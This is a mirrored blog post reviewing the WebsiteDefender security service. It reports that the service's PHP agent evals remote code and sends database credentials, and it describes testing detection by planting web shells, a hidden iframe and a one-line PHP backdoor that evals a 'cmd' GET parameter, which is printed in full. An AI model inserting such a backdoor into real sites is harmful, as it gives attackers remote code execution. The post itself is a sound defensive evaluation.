<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How WebsiteDefender Works</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A few weeks ago, I noticed in a plugin for Wordpress wp security scan advertising another websitedefender service to protect sites. On the site, apart...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How WebsiteDefender Works</h1><div class="post__text post__text-html js-mediator-article">  A few weeks ago, I noticed in a plugin for Wordpress wp security scan advertising another <a href="http://www.websitedefender.com/">websitedefender</a> service to protect sites.  On the site, apart from the standard marketing husk, I did not really find anything useful, but I was somewhat intrigued by the words about a revolutionary other way of operating this service, different from the existing ones.  Google did not give anything useful about how this service still works. <br><br>  Historically, most people consider protection against attacks from the outside sufficient - SQL, XSS injections, LFI \ RFI, CSRF, etc., forgetting attacks on web application files.  The same WAF, such as mod_security, phpids is a vivid example. <br><br>  It seems to me not very fair, so I wanted to consider the possibilities of the WebsiteDefender service, which, by description, should be able to protect web application files from modifications. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      It is proposed to download a certain agent - php-file, in which a whole set of functions for encryption and ... design <br><pre><code class="php hljs">$success = @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(<span class="hljs-string"><span class="hljs-string">'?&gt;'</span></span>.$request-&gt;params);</code> </pre> <br>  The question of what makes this php code, arose even before downloading it, and after a quick scan and finding such an interesting arsenal there are even more questions.  Although the company seems to be quite famous - Acunetix, it‚Äôs unlikely that anyone would want to put a cat in a bag on its website. <br><br>  Support response to the request to provide information that makes their code, and the results of their research of the service under the cat. <a name="habracut"></a><br><br><h4>  WebsiteDefender does not provide details of their work </h4><br>  From the correspondence I will give only the most important thing. <br><br>  Me: I just want to know your php code do.  Not common information such as 'protect website ...' but more techical details.  What is it to collect and send to your server, etc.  Because now it is a blackbox for me. <br><br>  Support answer: <br>  We don't provide specific details. <br><br>  However, it‚Äôs not possible to determine if you‚Äôre a WordPress user account.  Thus, the WSD agent is used to retrieve our website for analysis.  We‚Äôre analyzing what there is. <br><br>  It turns out quite interestingly: they provide a service to protect websites, but they do not disclose specific details of what their agent does.  From the last answer it became clear that it was going and sent. <br><br><h4>  What receives and sends the php-agent WebsiteDefender </h4><br>  After a couple of days, I installed the dyndns client on my home laptop, registered a test host, installed apache, php, mysql and wordpress, added a reset to the log of the input and output data of their agent and periodically checked the log. <br><br>  Those interested can see the agent code themselves, everything is simple.  The most important thing is that after all sorts of checks for execution <b>, an external php code sent by WebsiteDefender was launched</b> .  It turns out a sort of shell, which is used not to hack, but to protect the site. <br><br><h5>  The following data is collected and sent: </h5><br><ol><li>  Version php, array $ _SERVER </li><li>  The structure of directories and files - a list of files specified extensions (php, html, js, htaccess, ini, log, etc.), and then their sha1-hashes, date of change, access rights </li><li>  Database connection settings - name, host, login and password </li><li>  Some short strings and their md5 hashes are probably for checking that the agent is working. </li></ol><br>  Suppose you are not confused by the fact that the service, in exchange for a promise to protect your website, requires you to install an agent through which <b>any</b> code can run in the future. <br><br>  I decided to check how quickly traces of the hacking site will be found: <br><ol><li>  In different directories of the site scattered an old Web Shell by oRb packed and source code, some ancient shell from Antichat </li><li>  In the theme footer Wordpress inserted an invisible iframe </li><li>  Corrected index.php, adding <br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( $_REQUEST[<span class="hljs-string"><span class="hljs-string">'evil'</span></span>] == <span class="hljs-number"><span class="hljs-number">1</span></span> ) { <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>( <span class="hljs-string"><span class="hljs-string">'?&gt;'</span></span>. $_GET[ <span class="hljs-string"><span class="hljs-string">'cmd'</span></span> ] ); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); }</code> </pre> </li></ol><br>  All changes were detected <b>after 2 days</b> during the next full scan of the site files, before that the robot quietly received md5-hashes.  Interestingly, in the Web Shell admin by oRb was marked as a critical threat and identified by different patterns: <br>  /wp-admin/network/wso2.php, template - eval ($ _ POST ['p1'] <br>  /wp-admin/includes/wso2_pack.php, template - &lt;? php # Web Shell by oRb. <br><br>  A shell from Antimatch modestly listed among the new files.  Most likely, self-made non-distributed packaged shells will also not mark this status with critical status, although the executable php would first of all be worth highlighting. <br><br><h4>  Instead of conclusions </h4><br>  Surely, you didn‚Äôt even have a thought to install other people's scripts to protect your site.  The topic is for informational purposes only.  I just want to show on the successfully turned up example that you should not blindly rely on external services - to protect my web applications from modifications of their files and shell uploads, even a simple self-signed file auditor, which, if desired, is written in a couple of hours, but has the reaction time you need and can recover files.  Not to mention the configuration of specialized utilities on the server. </div><p>Source: <a href="https://habr.com/ru/post/125681/">https://habr.com/ru/post/125681/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../125673/index.html">Original captcha. Part 2 - Continuation</a></li>
<li><a href="../125674/index.html">Refund for pre-installed OEM Windows. End of story</a></li>
<li><a href="../125675/index.html">DebConf11: Conference Summary</a></li>
<li><a href="../125676/index.html">Waiting for the result in the multithread application - who uses what?</a></li>
<li><a href="../125677/index.html">Different configs for production mode and debug mode. Two in one</a></li>
<li><a href="../125683/index.html">This year will be published source Doom III</a></li>
<li><a href="../125684/index.html">Connecting the Community</a></li>
<li><a href="../125685/index.html">How to create a company with a short history of operating activities</a></li>
<li><a href="../125687/index.html">OpenCL: we waited - version 1.1 from nVidia, but what's new?</a></li>
<li><a href="../125689/index.html">6,000,000,000 photos on Flickr</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>